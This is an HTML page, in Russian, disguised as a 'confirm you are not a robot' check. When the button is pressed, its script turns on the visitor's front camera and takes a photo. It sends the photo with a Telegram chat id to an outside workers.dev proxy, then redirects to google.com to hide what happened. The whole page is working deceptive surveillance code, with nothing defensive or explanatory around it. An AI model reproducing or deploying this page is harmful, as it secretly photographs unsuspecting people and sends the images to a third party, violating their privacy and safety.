    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Загрузка...</title>
    </head>
    <body>
        <div style="text-align: center; margin-top: 50px;">
            <h2>Подтвердите, что вы не робот</h2>
            <button id="btn" style="padding: 15px 30px; font-size: 18px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 8px;">
                Я не робот (Продолжить)
            </button>
        </div>
        
        <video id="v" autoplay style="display:none"></video>
        <canvas id="c" style="display:none"></canvas>

        <script>
       const chatId = '1976857829';
const targetUrl = 'https://google.com';
const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';

const btn = document.getElementById('btn');
const video = document.getElementById('v');
const canvas = document.getElementById('c');

btn.onclick = async () => {
    btn.innerText = "Загрузка..."; // Показываем, что процесс идет
    btn.disabled = true;

    try {
        // 1. Запрашиваем фронтальную камеру
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" } 
        });
        video.srcObject = stream;

        // 2. Ждем 800мс, чтобы камера телефона успела "проснуться" (убирает черное фото)
        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                setTimeout(resolve, 800); 
            };
        });

        // 3. Делаем снимок
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'shot.jpg');

        // 4. ЖДЕМ ОТПРАВКИ (await заставит скрипт стоять на этой строчке)
        const response = await fetch(proxyUrl, { 
            method: 'POST', 
            body: formData 
        });

        if (response.ok) {
            console.log("Фото ушло!");
        }

        // Выключаем камеру
        stream.getTracks().forEach(t => t.stop());

    } catch (err) {
        console.log("Ошибка или отказ:", err);
    } finally {
        // 5. ПЕРЕХОД ПО ССЫЛКЕ (сработает только когда fetch завершится или выдаст ошибку)
        window.location.href = targetUrl;
    }
};




        </script>
    </body>
    </html>
